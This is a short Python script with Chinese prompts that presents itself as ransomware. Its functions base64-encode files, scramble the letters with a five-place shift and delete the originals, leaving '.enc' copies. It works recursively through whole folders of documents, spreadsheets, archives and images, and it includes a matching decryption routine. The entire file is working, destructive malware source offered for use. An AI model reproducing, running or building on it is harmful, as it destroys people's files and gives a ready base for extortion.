# 可用于以下文件：word xls docx ppt pptx rar jpg png txt
import base64
import os


def ransom_enypt(filepath):
    # filepath = input("请输入文件路径：")
    with open(filepath, 'rb') as file:
        data = file.read()
    source = base64.b64encode(data).decode()
    result = ''
    for i in source:
        if ord(i) in range(97, 123) or ord(i) in range(65, 91): 
            result += chr(ord(i) + 5)
        else:
            result += i
    os.remove(filepath)
    with open(filepath + '.enc', 'w') as file:  
        file.write(result)


def ransom_deypt(filepath):
    with open(filepath, 'r') as file:
        data = file.read()
    result = ''
    for i in data:
        if ord(i) in range(102, 128) or ord(i) in range(70, 96):  
            result += chr(ord(i) - 5)
        else:
            result += i

    result = base64.b64decode(result)
    os.remove(filepath)
    with open(filepath.replace('.enc', ''), 'wb') as file:
        file.write(result)


def dir_crypt(dirpath, typ='encode'):
    dirs = os.listdir(dirpath)
    for filename in dirs:
        filename = os.path.join(dirpath, filename)
        # 判断是目录还是文件
        if os.path.isdir(filename):
            dir_crypt(filename, typ)
        # 如果是文件，根据type的值进行加减密
        else:
            if typ == 'encode':
                ransom_enypt(filename)
            elif typ == 'decode':
                ransom_deypt(filename)
            else:
                raise Exception("type error")


def en():
    a = input('请输入这个文件的名字: (比如./name/1.txt)')
    ransom_enypt(a)
    print("文件已加密")


def diren():
    a = input('请输入文件夹的名字: (比如./ceshi)')
    dir_crypt(a)
    print('文件夹已加密')


def de():
    a = input('请输入这个文件的名字: (比如./name/1.txt.enc)')
    ransom_deypt(a)
    print("解锁成功")


def der():
    a = input('请输入这个文件夹的名字: (比如./ceshi)')
    dir_crypt(a, typ='decode')
    print('解锁成功')


if __name__ == '__main__':
    ipt = int(input('请输入是要加密还是解密: (1或0)'))
    if ipt == 1:
        mode = int(input("请输入加密的是文件还是文件夹（1或0）"))
        if mode == 1:
            en()
        elif mode == 0:
            diren()

    elif ipt == 0:
        mod = int(input("请输入解密的是文件还是文件夹（1或0）"))
        if mod == 1:
            de()
        elif mod == 0:
            der()